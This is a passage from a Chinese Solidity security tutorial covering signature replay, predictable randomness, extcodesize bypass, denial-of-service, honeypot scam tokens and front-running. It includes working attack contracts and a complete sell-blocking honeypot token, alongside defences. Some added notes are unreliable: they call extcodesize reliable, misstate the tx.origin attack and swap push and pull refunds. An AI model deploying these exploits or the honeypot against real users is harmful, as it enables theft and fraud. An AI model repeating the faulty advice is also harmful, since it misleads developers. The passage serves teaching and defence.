     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash
     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
     * amount: 1000
     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be
     */
    function getMessageHash(address to, uint256 amount) public pure returns(bytes32){
        return keccak256(abi.encodePacked(to, amount));
    }

    /**
     * @dev 获得以太坊签名消息
     * `hash`：消息哈希 
     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]
     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`
     * 添加"\x19Ethereum Signed Message:\n32"字段，防止签名的是可执行交易。
     */
    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) {
        // 32 is the length in bytes of hash,
        // enforced by the type signature above
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

    // ECDSA验证
    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool){
        return ECDSA.recover(_msgHash, _signature) == signer;
    }
    //签名验证: verify 函数接收消息哈希和签名，使用 ECDSA.recover 函数尝试从签名中恢复出签名者的地址，并与 signer 变量进行比较。
	//返回值: 如果恢复出的地址与 signer 匹配，则返回 true，表示签名有效；否则返回 false。
```



**注意** 铸造函数 `badMint()` 没有对 `signature` 查重，导致同样的签名可以多次使用，无限铸造代币。

```solidity
    function badMint(address to, uint amount, bytes memory signature) public {
        bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount)));
        require(verify(_msgHash, signature), "Invalid Signer!");
        _mint(to, amount);
    }
```



## `Remix` 复现

**1.** 部署 `SigReplay` 合约，签名者地址 `signer` 被初始化为部署钱包地址。



![img](https://www.wtf.academy/assets/images/S06-2-a0bce073efacfc8f4d6fbb2abf71ce33.png)



**2.** 利用`getMessageHash`函数获取消息。



![img](https://www.wtf.academy/assets/images/S06-3-890933eeebfd9f7fab0a0ceabcb1ca6d.png)



**3.** 点击 `Remix` 部署面板的签名按钮，使用私钥给消息签名。



![img](https://www.wtf.academy/assets/images/S06-4-25aed48b7fdbfd5d8fb9ee7788e67d0a.png)



**4.** 反复调用 `badMint` 进行签名重放攻击，铸造大量代币。



![img](https://www.wtf.academy/assets/images/S06-5-49a5971196499c47dc76532e912e6e9b.png)



## 预防办法

签名重放攻击主要有两种预防办法：

1. 将使用过的签名记录下来，比如记录下已经铸造代币的地址 `mintedAddress`，防止签名反复使用：

   ~~~solidity
   mapping(address => bool) public mintedAddress;   // 记录已经mint的地址
   
   function goodMint(address to, uint amount, bytes memory signature) public {
       bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));
       require(verify(_msgHash, signature), "Invalid Signer!");
       // 检查该地址是否mint过
       require(!mintedAddress[to], "Already minted");
       // 记录mint过的地址
       mintedAddress[to] = true;
       _mint(to, amount);
   }
   ```solidity
   ~~~

   

2. 将 `nonce` （数值随每次交易递增）和 `chainid` （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击：

   ```solidity
   uint nonce;
   
   function nonceMint(address to, uint amount, bytes memory signature) public {
       bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));
       require(verify(_msgHash, signature), "Invalid Signer!");
       _mint(to, amount);
       nonce++;
   }
   ```

   

## 总结

这一讲，我们介绍了智能合约中的签名重放漏洞，并介绍了两个预防方法：

1. 将使用过的签名记录下来，防止二次使用。
2. 将 `nonce` 和 `chainid` 包含到签名消息中。

# S07. 坏随机数

这一讲，我们将介绍智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。

## 伪随机数

很多以太坊上的应用都需要用到随机数，例如`NFT`随机抽取`tokenId`、抽盲盒、`gamefi`战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（`public`）且确定性（`deterministic`）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如`random()`。很多项目方不得不使用链上的伪随机数生成方法，例如 `blockhash()` 和 `keccak256()` 方法。

坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有`NFT`而非随机抽取。更多的内容可以阅读 [WTF Solidity极简教程 第39讲：伪随机数](https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random)。



![img](https://www.wtf.academy/assets/images/S07-1-bf30a2dd2ec766d879cf8e5da4f8a756.png)



## 坏随机数案例

下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。

```solidity
contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("", ""){}

    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}
```



它有一个主要的铸造函数 `luckyMint()`，用户调用时输入一个 `0-99` 的数字，如果和链上生成的伪随机数 `randomNumber` 相等，即可铸造幸运 NFT。伪随机数使用 `blockhash` 和 `block.timestamp` 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。

下面我们写个攻击合约 `Attack.sol`。

```solidity
contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // 提前计算随机数
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // 利用 luckyNumber 攻击
        nftAddr.luckyMint(luckyNumber);
    }
}
```



攻击函数 `attackMint()`中的参数为 `BadRandomness`合约地址。在其中，我们计算了随机数 `luckyNumber`，然后将它作为参数输入到 `luckyMint()` 函数完成攻击。由于`attackMint()`和`luckyMint()`将在同一个区块中调用，`blockhash`和`block.timestamp`是相同的，利用他们生成的随机数也相同。

## `Remix` 复现

由于 Remix 自带的 Remix VM不支持 `blockhash`函数，因此你需要将合约部署到以太坊测试链上进行复现。

1. 部署 `BadRandomness` 合约。
2. 部署 `Attack` 合约。
3. 将 `BadRandomness` 合约地址作为参数传入到 `Attack` 合约的 `attackMint()` 函数并调用，完成攻击。
4. 调用 `BadRandomness` 合约的 `balanceOf` 查看`Attack` 合约NFT余额，确认攻击成功。

## 预防方法

我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测。更多介绍可以阅读 [WTF Solidity极简教程 第39讲：伪随机数](https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random)。

## 总结

这一讲我们介绍了坏随机数漏洞，并介绍了一个简单的预防方法：使用预言机项目提供的链下随机数。NFT 和 GameFi 项目方应避免使用链上伪随机数进行抽奖，以防被黑客利用。

# S08. 绕过合约长度检查

这一讲，我们将介绍绕过合约长度检查，并介绍预防的方法。

## 绕过合约检查

很多 freemint 的项目为了限制科学家（程序员）会用到 `isContract()` 方法，希望将调用者 `msg.sender` 限制为外部账户（EOA），而非合约。这个函数利用 `extcodesize` 获取该地址所存储的 `bytecode` 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。

```solidity
    // 利用 extcodesize 检查是否为合约
    function isContract(address account) public view returns (bool) {
        // extcodesize > 0 的地址一定是合约地址
        // 但是合约在构造函数时候 extcodesize 为0
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
```



这里有一个漏洞，就是在合约在被创建的时候，`runtime bytecode` 还没有被存储到地址上，因此 `bytecode` 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 `constructor` 中的话，就可以绕过 `isContract()` 检查。



![img](https://www.wtf.academy/assets/images/S08-1-c3e3cc92dc80885085ac679be80ed950.png)

> [!NOTE]
>
> 在以太坊中，当一个合约的构造函数正在执行时，合约的代码尚未被完全部署到区块链上。因此，在构造函数执行期间，`extcodesize` 返回值为 0。这个行为可以从以下几个方面来理解：
>
> 1. **合约创建过程**:
>    - 在以太坊中，合约的创建是一个分两步的过程：
>      1. 先创建一个新的合约地址。
>      2. 然后将合约的字节码（代码）存储在该地址中。
>    - 当合约的构造函数正在执行时，合约的字节码尚未完全写入到区块链上，导致 `extcodesize` 返回 0。
>
> 2. **`extcodesize` 的定义**:
>    - `extcodesize` 是一个低级的 Solidity 函数，它返回指定地址的合约代码的字节长度。
>    - 如果地址没有代码（即该地址不是合约），或如果合约正在被创建（此时代码还未被写入），`extcodesize` 将返回 0。
>
> 3. **安全性考虑**:
>    - 这种设计使得合约在构造函数执行期间，能够在某种程度上防止其他合约的调用。即在合约的创建和初始化过程中，合约的状态和行为尚未对外暴露，外部合约无法访问其方法。
>    - 然而，这也为攻击者提供了一个机会，他们可以在合约尚未完全部署的时候执行特定操作，例如在 `NotContract` 合约的构造函数中调用其他合约的函数。
>
> ### 总结
>
> 合约在构造函数执行期间 `extcodesize` 返回 0 的原因在于合约的代码尚未完全存储到区块链上。这种设计虽然具有一定的安全性，但也可能被攻击者利用。为了防止这类攻击，开发者应在合约设计中引入额外的安全机制。



## 漏洞例子

下面我们来看一个例子：`ContractCheck`合约是一个 freemint ERC20 合约，铸造函数 `mint()` 中使用了 `isContract()` 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 `mint()` 可以铸造 100 枚代币。

```solidity
// 用extcodesize检查是否为合约地址
contract ContractCheck is ERC20 {
    // 构造函数：初始化代币名称和代号
    constructor() ERC20("", "") {}
    
    // 利用 extcodesize 检查是否为合约
    function isContract(address account) public view returns (bool) {
        // extcodesize > 0 的地址一定是合约地址
        // 但是合约在构造函数时候 extcodesize 为0
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // mint函数，只有非合约地址能调用（有漏洞）
    function mint() public {
        require(!isContract(msg.sender), "Contract not allowed!");
        _mint(msg.sender, 100);
    }
}
```



我们写一个攻击合约，在 `constructor` 中多次调用 `ContractCheck` 合约中的 `mint()` 函数，批量铸造 `1000` 枚代币：

```solidity
// 利用构造函数的特点攻击
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // This will work
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // 合约创建好以后，extcodesize > 0，isContract() 可以检测
    function mint() external {
        ContractCheck(contractCheck).mint();
    }
}
```

> [!TIP]
>
> **构造函数参数**: 接收一个地址 `addr`，这个地址应该是之前部署的 `ContractCheck` 合约的地址。
>
> **构造函数的逻辑**:
>
> - `contractCheck` 被初始化为传入的地址。
> - 通过调用 `ContractCheck(addr).isContract(address(this))` 检查当前合约是否被识别为合约。在构造函数执行期间，`extcodesize` 为 0，因此 `isContract` 的值将为 `false`。
> - 由于此时 `isContract` 的值为 `false`，执行 `for` 循环，调用 `ContractCheck` 合约的 `mint` 函数 10 次。这是攻击的关键所在：在合约创建期间，`NotContract` 并不被 `ContractCheck` 识别为合约，因此能够成功铸造代币。

如果我们之前讲的是正确的话，在构造函数调用 `mint()` 可以绕过 `isContract()` 的检查成功铸造代币，那么函数将成功部署，并且状态变量 `isContract` 会在构造函数赋值 `false`。而在合约部署之后，`runtime bytecode` 已经被存储在合约地址上了，`extcodesize > 0`， `isContract()` 能够成功阻止铸造，调用 `mint()` 函数将失败。

## `Remix` 复现

1. 部署 `ContractCheck` 合约。
2. 部署 `NotContract` 合约，参数为 `ContractCheck` 合约地址。
3. 调用 `ContractCheck` 合约的 `balanceOf` 查看 `NotContract` 合约的代币余额为 `1000`，攻击成功。
4. 调用`NotContract` 合约的 `mint()` 函数，由于此时合约已经部署完成，调用 `mint()` 函数将失败。

## 预防办法

你可以使用 `(tx.origin == msg.sender)` 来检测调用者是否为合约。如果调用者为 EOA，那么`tx.origin`和`msg.sender`相等；如果它们俩不相等，调用者为合约。

```text
function realContract(address account) public view returns (bool) {
    return (tx.origin == msg.sender);
}
```

> [!TIP]
>
> **安全性问题**: 尽管逻辑上是合理的，但依赖 `tx.origin` 在安全上是有风险的。攻击者可以通过合约调用的方式利用这种方法进行重放攻击或其他恶意行为。:在智能合约开发中，通常不建议使用 `tx.origin`。大多数情况下，开发者倾向于使用 `msg.sender` 来进行权限验证和合约间交互，因为 `msg.sender` 提供了更清晰的上下文，而 `tx.origin` 可能引入不必要的复杂性和安全隐患。
>
> ### 安全性问题详解
>
> 依赖 `tx.origin` 在智能合约中的确存在一些潜在的安全性问题，以下是一些常见的风险和攻击场景：
>
> #### 1. 重放攻击
>
> 重放攻击是指攻击者利用合约的功能来发起意图不良的交易。例如，如果某个合约允许 EOA 调用特定函数并依赖 `tx.origin` 来判断调用者，攻击者可以创建一个恶意合约，并通过调用这个合约的函数，从而间接调用目标合约。这意味着，即使目标合约只允许 EOA 调用，但攻击者仍然可以通过其合约间接调用并利用目标合约的功能。
>
> **示例场景**:
>
> - 假设某合约有一个安全的函数，只允许特定的 EOA 调用。当攻击者创建一个合约并调用这个函数时，`tx.origin` 将指向最初的 EOA，而 `msg.sender` 将指向攻击者的合约。攻击者可以利用这一点执行原本不被允许的操作。
>
> #### 2. 权限管理漏洞
>
> 如果合约使用 `tx.origin` 来进行权限验证，攻击者可以通过操控其合约，使得目标合约误认为是合法调用者。例如，某个合约设计为只允许某个特定的 EOA 调用某个敏感函数，但因为 `tx.origin` 返回的是最初的 EOA，攻击者可以利用这种逻辑绕过权限限制。
>
> #### 3. 合约间的复杂关系
>
> 使用 `tx.origin` 可能导致合约之间的复杂调用关系，使得合约的行为不易预测。开发者可能在不知情的情况下引入不必要的依赖关系，这使得合约的安全性降低，并增加了审计的难度。
>
> #### 4. 调用链的误判
>
> 由于 `tx.origin` 始终返回最初的 EOA，开发者可能在合约中错误地假设调用者是 EOA，而实际上调用者是另一个合约。这种误判可能导致合约执行错误或出现未预见的漏洞，特别是在复杂的合约交互中。
>
> ### 安全实践建议
>
> 1. **避免使用 `tx.origin`**: 尽量不要在合约中使用 `tx.origin` 进行权限验证。可以使用 `msg.sender` 来精确判断调用者。
>
> 2. **使用 `extcodesize`**: 如果需要判断某个地址是否为合约，可以使用 `extcodesize`，这种方法更加可靠，因为它能够准确判断某个地址是否是合约。
>
> 3. **清晰的权限控制**: 在合约设计中，确保权限控制清晰明了，减少合约间的复杂依赖关系，以降低潜在的攻击面。
>
> 4. **审计和测试**: 对合约进行严格的审计和测试，尤其是在涉及权限管理和关键功能时，确保没有依赖不当导致的安全漏洞。
>
> 通过遵循这些安全实践，可以更有效地防范潜在的安全风险，提高智能合约的安全性。

> [!NOTE]
>
> 下面是一个示例，展示了如何利用 `tx.origin` 进行权限管理的漏洞，以及攻击者如何通过一个恶意合约间接调用目标合约的敏感函数。
>
> ### 1. 目标合约（TargetContract）
>
> 这个合约中有一个敏感的函数 `sensitiveFunction`，该函数仅允许某个特定的 EOA（例如，部署者）调用：
>
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.8.21;
> 
> contract TargetContract {
>     address public owner;
> 
>     constructor() {
>         owner = msg.sender;  // 设置合约的拥有者
>     }
> 
>     // 仅允许合约拥有者调用
>     function sensitiveFunction() public {
>         require(tx.origin == owner, "Not the owner");  // 权限验证
>         // 敏感操作
>     }
> }
> ```
>
> ### 2. 攻击者合约（AttackerContract）
>
> 攻击者可以创建一个合约，利用 `tx.origin` 的机制间接调用 `sensitiveFunction`：
>
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.8.21;
> 
> contract AttackerContract {
>     TargetContract target;
> 
>     constructor(address targetAddress) {
>         target = TargetContract(targetAddress);
>     }
> 
>     // 攻击者可以调用这个函数，间接触发敏感操作
>     function attack() external {
>         target.sensitiveFunction();  // 调用目标合约的敏感函数
>     }
> }
> ```
>
> ### 3. 使用示例
>
> 1. **部署**: 首先，部署 `TargetContract`。假设部署者的地址为 `0x123...`。
>
> 2. **攻击**: 然后，攻击者部署 `AttackerContract`，并在构造函数中传入 `TargetContract` 的地址。接下来，攻击者调用 `attack` 函数。
>
> ```solidity
> // 部署 TargetContract
> TargetContract target = new TargetContract(); 
> 
> // 部署 AttackerContract，传入目标合约地址
> AttackerContract attacker = new AttackerContract(address(target));
> 
> // 攻击者调用攻击函数
> attacker.attack();
> ```
>
> ### 漏洞分析
>
> 在这个例子中，`sensitiveFunction` 的权限检查依赖于 `tx.origin`。虽然 `tx.origin` 指向最初的 EOA（即合约的部署者），攻击者却可以通过其合约直接调用 `sensitiveFunction`，从而绕过权限限制，执行敏感操作。
>
> ### 防御建议
>
> - **使用 `msg.sender`**: 权限检查应使用 `msg.sender` 而非 `tx.origin`。这可以确保只有直接调用合约的地址才能访问敏感函数。
>   
>   修改后的代码如下：
>
> ```solidity
> function sensitiveFunction() public {
>     require(msg.sender == owner, "Not the owner");  // 使用 msg.sender 进行权限验证
>     // 敏感操作
> }
> ```
>
> 通过这种方式，可以有效地防止攻击者通过间接调用来获取对敏感功能的访问权限。



## 总结

这一讲，我们介绍了合约长度检查可以被绕过的漏洞，并介绍预防的方法。如果一个地址的 `extcodesize > 0`，则该地址一定为合约；但如果 `extcodesize = 0`，该地址既可能为 `EOA`，也可能为正在创建状态的合约。

# S09. 拒绝服务

这一讲，我们将介绍智能合约的拒绝服务（Denial of Service, DoS）漏洞，并介绍预防的方法。NFT 项目 Akutar 曾因为 DoS 漏洞损失 11,539 ETH，当时价值 3400 万美元。

## DoS

在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。

在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用[荷兰拍卖](https://github.com/AmazingAng/WTF-Solidity/tree/main/35_DutchAuction)进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。



![img](https://www.wtf.academy/assets/images/S09-1-43a72828ee356e519320789f76c8c03e.png)



## 漏洞例子

下面我们学习一个简化了的 Akutar 合约，名字叫 `DoSGame`。这个合约逻辑很简单，游戏开始时，玩家们调用 `deposit()` 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，`refund()`函数被调用，将 ETH 依次退款给所有玩家。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // 所有玩家存ETH到合约里
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // 记录存款
        balanceOf[msg.sender] = msg.value;
        // 记录玩家地址
        players.push(msg.sender);
    }

    // 游戏结束，退款开始，所有玩家将依次收到退款
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // 通过循环给所有玩家退款
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}
```



这里的漏洞在于，`refund()` 函数中利用循环退款的时候，是使用的 `call` 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。

```text
(bool success, ) = player.call{value: refundETH}("");
```



下面我们写个攻击合约， `attack()` 函数中将调用 `DoSGame` 合约的 `deposit()` 存款并参与游戏；`fallback()` 回调函数将回退所有向该合约发送`ETH`的交易，对`DoSGame` 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。

```solidity
contract Attack {
    // 退款时进行DoS攻击
    fallback() external payable{
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
```



## `Remix` 复现

**1.** 部署 `DoSGame` 合约。 **2.** 调用 `DoSGame` 合约的 `deposit()`，进行存款并参与游戏。

![img](https://www.wtf.academy/assets/images/S09-2-a8f046dbf630b69b351b14404ff10733.png)

**3.** 此时，如果游戏结束调用 `refund()` 退款的话是可以正常退款的。

![img](https://www.wtf.academy/assets/images/S09-3-fca0d06a449c3a3f216956e610efaea7.jpg)

**3.** 重新部署 `DoSGame` 合约，并部署 `Attack` 合约。 **4.** 调用 `Attack` 合约的 `attack()`，进行存款并参与游戏。

![img](https://www.wtf.academy/assets/images/S09-4-9b9de31c4d40da42b8a361b89f118d95.jpg)

**4.** 调用 `DoSGame` 合约`refund()`，进行退款，发现不能正常运行，攻击成功。

![img](https://www.wtf.academy/assets/images/S09-5-0fef19e2bd99ff1aad2c83e2a4bf0f5b.jpg)



## 预防方法

很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：

1. 外部合约的函数调用（例如 `call`）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 `require(success, "Refund Fail!");` 去掉，退款在单个地址失败时仍能继续运行。
2. 合约不会出乎意料的自毁。
3. 合约不会进入无限循环。
4. `require` 和 `assert` 的参数设定正确。
5. 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。
6. 确保回调函数不会影响正常合约运行。
7. 确保当合约的参与者（例如 `owner`）永远缺席时，合约的主要业务仍能顺利运行。

## 总结

这一讲，我们介绍了智能合约的拒绝服务漏洞，Akutar 项目因为该漏洞损失了一万多枚ETH。很多逻辑错误都能导致DoS，开发者写智能合约时要万分谨慎，比如退款要让用户自行领取，而非合约批量发送给用户。

# S10. 貔貅

这一讲，我们将介绍貔貅合约和预防方法（英文习惯叫蜜罐代币 honeypot token）。

## 貔貅学入门

[貔貅](https://en.wikipedia.org/wiki/Pixiu)是中国的一个神兽，因为在天庭犯了戒，被玉帝揍的肛门封闭了，只能吃不能拉，可以帮人们聚财。但在Web3中，貔貅变为了不详之兽，韭菜的天敌。貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。

通常一个貔貅盘有如下的生命周期：

1. 恶意项目方部署貔貅代币合约。
2. 宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。
3. 项目方`rug pull`卷走资金。



![img](https://www.wtf.academy/assets/images/S10-1-ec70dde10b03095a903dee5e50714635.png)



学会貔貅合约的原理，才能更好的识别并避免被割，才能做一个顽强的韭菜！

## 貔貅合约

这里我们介绍一个极简的ERC20代币貔貅合约`Pixiu`。在该合约中，只有合约拥有者可以在`uniswap`出售代币，其他地址不能。

`Pixiu` 有一个状态变量`pair`，用于记录`uniswap`中 `Pixiu-ETH LP`的币对地址。它主要有三个函数：

1. 构造函数：初始化代币的名称和代号，并根据 `uniswap` 和 `create2` 的原理计算`LP`合约地址，具体内容可以参考 [WTF Solidity 第25讲: Create2](https://github.com/AmazingAng/WTF-Solidity/blob/main/25_Create2/readme.md)。这个地址会在 `_update()` 函数中用到。
2. `mint()`：铸造函数，仅 `owner` 地址可以调用，用于铸造 `Pixiu` 代币。
3. `_update()`：`ERC20`代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 `to` 为 `LP` 的时候，也就是韭菜卖出的时候，交易会 `revert`；只有调用者为`owner`的时候能够成功。这也是貔貅合约的核心。

```solidity
// 极简貔貅ERC20代币，只能买，不能卖
contract HoneyPot is ERC20, Ownable {
    address public pair;

    // 构造函数：初始化代币名称和代号
    constructor() ERC20("HoneyPot", "Pi Xiu") {
        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory
        address tokenA = address(this); // 貔貅代币地址
        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序
        bytes32 salt = keccak256(abi.encodePacked(token0, token1));
        // calculate pair address
        pair = address(uint160(uint(keccak256(abi.encodePacked(
        hex'ff',
        factory,
        salt,
        hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
        )))));  // Uniswap V2 pair合约的初始化代码哈希
    }
    
    /**
     * 铸造函数，只有合约所有者可以调用
     */
    function mint(address to, uint amount) public onlyOwner {
        _mint(to, amount);
    }

    /**
     * @dev See {ERC20-_update}.
     * 貔貅函数：只有合约拥有者可以卖出
    */
    function _update(
      address from,
      address to,
      uint256 amount
  ) internal virtual override {
     if(to == pair){
        require(from == owner(), "Can not Transfer");
      }
      super._update(from, to, amount);
  }
}
```

> [!NOTE]
>
> `internal` 表示该函数只能在合约本身及其继承的合约中调用。这意味着：
>
> - **不能被外部直接调用**：外部账户或其他合约不能直接调用 `internal` 函数。
> - **继承关系中的访问**：该函数可以在当前合约或从当前合约继承的合约中被访问和使用。

> [!TIP]
>
> `virtual` 允许该函数在继承时被子类重写（即覆盖）。如果没有 `virtual` 关键字，子合约就无法修改父合约中的函数行为。
>
> - **允许子类重写**：在子合约中可以定义一个与父合约相同名称和参数的函数，并通过 `override` 关键字实现不同的行为。
> - **强制继承链中的设计**：`virtual` 使得父合约明确表示这个函数是可以被修改的。



## `Remix` 复现

我们会在 `Goerli` 测试网上部署 `Pixiu` 合约，并在 `uniswap` 交易所中演示。

1. 部署 `Pixiu` 合约。

   ![img](https://www.wtf.academy/assets/images/S10-2-5256a28d8c1e3e968163c225de35e9de.png)

   

2. 调用 `mint()` 函数，给自己铸造 `100000` 枚貔貅币。

   ![img](https://www.wtf.academy/assets/images/S10-3-f2299ab9d34b3f3b58e270bc2773de5d.png)

   

3. 进入 [uniswap](https://app.uniswap.org/#/add/v2/ETH) 交易所，为貔貅币创造流动性（v2），提供 `10000`貔貅币。和 `0.1` ETH。

   ![img](https://www.wtf.academy/assets/images/S10-4-0b959596910489d4a14bac33eaf23339.png)

   

4. 出售 `100` 貔貅币，能够操作成功。

   ![img](https://www.wtf.academy/assets/images/S10-5-6e23db58ab7a8ec48a8df92862d4cec3.png)

   

5. 切换到另一个账户，使用 `0.01` ETH 购买貔貅币，能够操作成功。

   ![img](https://www.wtf.academy/assets/images/S10-6-51d9e78adf9eed4573f2321e1b24aad8.png)

   

6. 出售貔貅币，无法弹出交易。

   ![img](https://www.wtf.academy/assets/images/S10-7-c1ee969a6d68fc8f325b3d899ed197a1.png)

   

## 潜在伪装

为了绕过相关的貔貅检查，有些貔貅合约还进行了一系列的伪装：

1. 譬如对于非特权用户的转账，不会进行回滚，而是保持状态不变，表面上显示交易成功，实际上依旧没有实现用户的真实交易意图。
2. 伪造错误的事件，通过emit不存在的事件误导正在监听事件的钱包和浏览器，使其进行错误的显示，从而使用户产生错误的判断。

## 预防方法

貔貅币是韭菜在链上梭哈最容易遇到的骗局，并且形式多变，预防非常有难度。我们有以下几点建议，可以降低被貔貅盘割韭菜的风险：

1. 在区块链浏览器上（比如[etherscan](https://etherscan.io/)）查看合约是否开源，如果开源，则分析它的代码，看是否有貔貅漏洞。
2. 如果没有编程能力，可以使用貔貅识别工具，比如 [Token Sniffer](https://tokensniffer.com/) 和 [Ave Check](https://ave.ai/check)，分低的话大概率是貔貅。
3. 看项目是否有审计报告。
4. 仔细检查项目的官网和社交媒体。
5. 只投资你了解的项目，做好研究（DYOR。
6. 使用tenderly、phalcon分叉模拟卖出貔貅，如果失败则确定是貔貅代币。

## 总结

这一讲，我们介绍了貔貅合约和预防貔貅盘的方法。貔貅盘是每个韭菜必经之路，大家也对它恨之入骨。另外，最近也出现貔貅 `NFT`，恶意项目方通过修改 `ERC721` 的转账或授权函数，使得普通投资者不能出售它们。了解貔貅合约的原理和预防方法，可以显著减少你买到貔貅盘的概率，让你的资金更安全，大家要不断学习。

# S11. 抢先交易

这一讲，我们将介绍智能合约的抢先交易（Front-running，抢跑）。据统计，以太坊上的套利者通过三明治攻击（sandwich attack）[共获利$12亿](https://dune.com/chorus_one/ethereum-mev-data)。

## Front-running

### 传统抢跑

抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信息并最先做出反应从而实现获利。这些攻击主要发生在股票市场交易和早期的域名注册。

2021 年 9 月，NFT 市场 OpenSea 的产品负责人 Nate Chastain，被发现通过抢先购买将在 OpenSea 首页展示的 NFT 获利。 他利用内幕信息来获得不公平的信息差，OpenSea 将要在首页推送哪些 NFT，然后在展出在首页前抢先买入，然后再在 NFT 登上首页后卖出。然而，有一个人通过将 NFT 交易时间戳与 OpenSea 上有问题的 NFT 的首页促销进行匹配，发现了这一非法行为，Nate 也被告上法院。

另一个传统抢跑的例子包括是在代币上[币安](https://www.wsj.com/articles/crypto-might-have-an-insider-trading-problem-11653084398?mod=hp_lista_pos4)/[coinbase](https://www.protocol.com/fintech/coinbase-crypto-insider-trading)等知名交易所之前，会有得知内幕消息的老鼠仓提前买入。在上币的公告发出后，币价会大幅上涨，这时抢跑者会卖出盈利。

### 链上抢跑

链上抢跑指的是搜索者或矿工通过调高`gas`或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而`MEV`是衡量这种利润的指标。

